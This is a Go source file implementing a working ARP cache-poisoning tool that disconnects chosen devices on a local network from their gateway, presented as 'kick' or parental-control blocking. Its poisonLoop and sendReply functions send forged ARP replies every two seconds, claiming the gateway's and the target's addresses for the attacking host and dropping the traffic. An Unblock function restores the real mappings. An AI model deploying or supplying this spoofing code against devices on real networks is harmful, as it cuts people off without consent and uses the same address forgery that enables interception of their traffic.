// Package spoofer implements ARP cache poisoning used to disconnect a
// selected LAN device from its gateway ("kick" / parental-control style
// blocking), and to restore normal connectivity afterwards.
package spoofer

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/netip"
	"sync"
	"time"

	"github.com/mdlayher/arp"
)

// Spoofer manages ARP-poisoning sessions that isolate individual devices
// from the LAN gateway.
type Spoofer struct {
	iface   *net.Interface
	gateway netip.Addr

	mu       sync.Mutex
	sessions map[string]*session // keyed by target IP string
}

type session struct {
	cancel     context.CancelFunc
	targetMAC  net.HardwareAddr
	gatewayMAC net.HardwareAddr
	targetIP   netip.Addr
}

// New creates a Spoofer bound to the given interface and gateway address.
func New(ifi *net.Interface, gateway netip.Addr) *Spoofer {
	return &Spoofer{
		iface:    ifi,
		gateway:  gateway,
		sessions: make(map[string]*session),
	}
}

// IsBlocked reports whether targetIP currently has an active poisoning
// session (i.e. is disconnected from the gateway).
func (s *Spoofer) IsBlocked(targetIP string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	_, ok := s.sessions[targetIP]
	return ok
}

// Block starts poisoning the ARP caches of targetIP and the gateway so that
// each believes the other is unreachable, effectively disconnecting the
// device from the network. Safe to call again on an already-blocked IP
// (no-op).
func (s *Spoofer) Block(targetIPStr string) error {
	targetIP, err := netip.ParseAddr(targetIPStr)
	if err != nil {
		return fmt.Errorf("parse target ip: %w", err)
	}

	s.mu.Lock()
	if _, exists := s.sessions[targetIPStr]; exists {
		s.mu.Unlock()
		return nil
	}
	s.mu.Unlock()

	c, err := arp.Dial(s.iface)
	if err != nil {
		return fmt.Errorf("dial arp: %w", err)
	}

	if err := c.SetDeadline(time.Now().Add(3 * time.Second)); err != nil {
		c.Close()
		return err
	}
	targetMAC, err := c.Resolve(targetIP)
	if err != nil {
		c.Close()
		return fmt.Errorf("resolve target %s: %w", targetIPStr, err)
	}
	gatewayMAC, err := c.Resolve(s.gateway)
	if err != nil {
		c.Close()
		return fmt.Errorf("resolve gateway %s: %w", s.gateway, err)
	}
	_ = c.SetDeadline(time.Time{}) // clear deadline for the poisoning loop

	ctx, cancel := context.WithCancel(context.Background())
	sess := &session{cancel: cancel, targetMAC: targetMAC, gatewayMAC: gatewayMAC, targetIP: targetIP}

	s.mu.Lock()
	s.sessions[targetIPStr] = sess
	s.mu.Unlock()

	go s.poisonLoop(ctx, c, sess)
	log.Printf("spoofer: blocking %s (mac=%s)", targetIPStr, targetMAC)
	return nil
}

// Unblock stops poisoning targetIP and sends corrective ARP replies so the
// target and gateway re-learn each other's real hardware addresses.
func (s *Spoofer) Unblock(targetIPStr string) error {
	s.mu.Lock()
	sess, ok := s.sessions[targetIPStr]
	if ok {
		delete(s.sessions, targetIPStr)
	}
	s.mu.Unlock()
	if !ok {
		return nil
	}
	sess.cancel()

	c, err := arp.Dial(s.iface)
	if err != nil {
		return fmt.Errorf("dial arp: %w", err)
	}
	defer c.Close()

	// Restore real mappings on both sides.
	sendReply(c, s.gateway, sess.gatewayMAC, sess.targetIP, sess.targetMAC)
	sendReply(c, sess.targetIP, sess.targetMAC, s.gateway, sess.gatewayMAC)
	log.Printf("spoofer: unblocked %s", targetIPStr)
	return nil
}

// StopAll cancels every active poisoning session, e.g. on server shutdown.
func (s *Spoofer) StopAll() {
	s.mu.Lock()
	ips := make([]string, 0, len(s.sessions))
	for ip := range s.sessions {
		ips = append(ips, ip)
	}
	s.mu.Unlock()
	for _, ip := range ips {
		_ = s.Unblock(ip)
	}
}

func (s *Spoofer) poisonLoop(ctx context.Context, c *arp.Client, sess *session) {
	defer c.Close()
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for {
		// Tell the target that WE are the gateway, and tell the gateway that
		// WE are the target. Since this process does not forward traffic,
		// the device is effectively cut off from the LAN/Internet.
		sendReply(c, s.gateway, c.HardwareAddr(), sess.targetIP, sess.targetMAC)
		sendReply(c, sess.targetIP, c.HardwareAddr(), s.gateway, sess.gatewayMAC)

		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}
	}
}

// sendReply crafts and sends an ARP reply claiming that srcIP is located at
// srcMAC, addressed to dstIP/dstMAC.
func sendReply(c *arp.Client, srcIP netip.Addr, srcMAC net.HardwareAddr, dstIP netip.Addr, dstMAC net.HardwareAddr) {
	pkt, err := arp.NewPacket(arp.OperationReply, srcMAC, srcIP, dstMAC, dstIP)
	if err != nil {
		log.Printf("spoofer: build packet: %v", err)
		return
	}
	if err := c.WriteTo(pkt, dstMAC); err != nil {
		log.Printf("spoofer: write packet to %s: %v", dstIP, err)
	}
}
